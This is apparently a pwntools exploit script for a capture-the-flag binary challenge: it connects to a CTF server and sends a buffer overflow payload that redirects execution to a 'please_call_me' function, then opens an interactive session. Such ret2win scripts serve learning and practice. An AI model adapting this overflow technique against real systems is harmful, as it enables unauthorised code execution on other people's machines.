from pwn import *

exe = './chall'

# p = process(exe)
p = remote('challs.ctf.cafe', 8888)
elf = context.binary = ELF(exe)

offset = 12

payload = flat({offset : elf.sym['please_call_me'] + 4})

p.sendline(payload)

p.interactive()